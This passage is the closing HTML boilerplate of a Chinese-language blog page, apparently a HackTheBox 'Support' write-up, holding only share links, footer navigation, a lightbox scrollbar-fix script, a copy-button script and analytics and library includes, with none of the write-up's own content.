  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&t=HackTheBox——HTB Support Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    n0nome
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

<script>
(function(){
  // 计算滚动条宽度
  function scrollbarWidth() {
    return window.innerWidth - document.documentElement.clientWidth;
  }

  function applyCompensation() {
    const w = scrollbarWidth();
    if (w > 0) {
      document.documentElement.style.paddingRight = w + 'px';
      document.body.style.paddingRight = w + 'px';
    }
  }

  function clearCompensation() {
    document.documentElement.style.paddingRight = '';
    document.body.style.paddingRight = '';
  }

  // MutationObserver：监测 Fancybox 容器加入/移除（通用且不依赖 Fancybox API 版本）
  const observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
      // 新增节点，若包含 Fancybox 容器则补偿
      for (const node of m.addedNodes) {
        if (node.nodeType === 1 && node.classList && node.classList.contains('fancybox__container')) {
          // slight delay to let browser apply overflow:hidden
          setTimeout(applyCompensation, 10);
        }
      }
      // 移除节点，若移除了 Fancybox 容器则清理补偿
      for (const node of m.removedNodes) {
        if (node.nodeType === 1 && node.classList && node.classList.contains('fancybox__container')) {
          clearCompensation();
        }
      }
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });

  // 额外：监听全局点击可能关闭 modal 的元素（保险）
  document.addEventListener('click', (e) => {
    if (e.target.closest('.fancybox__backdrop') || e.target.closest('.fancybox__button--close') || e.target.closest('[data-fancybox-close]')) {
      // 确保在关闭时清理
      setTimeout(clearCompensation, 10);
    }
  });

  // 当窗口大小改变时也清理（避免残留）
  window.addEventListener('resize', () => {
    if (document.querySelector('.fancybox__container') == null) clearCompensation();
  });

  // 可选：当页面加载时清理一次（预防样式残留）
  window.addEventListener('load', clearCompensation);
})();
</script>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

<!-- FancyBox -->

    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>


</body>
</html>
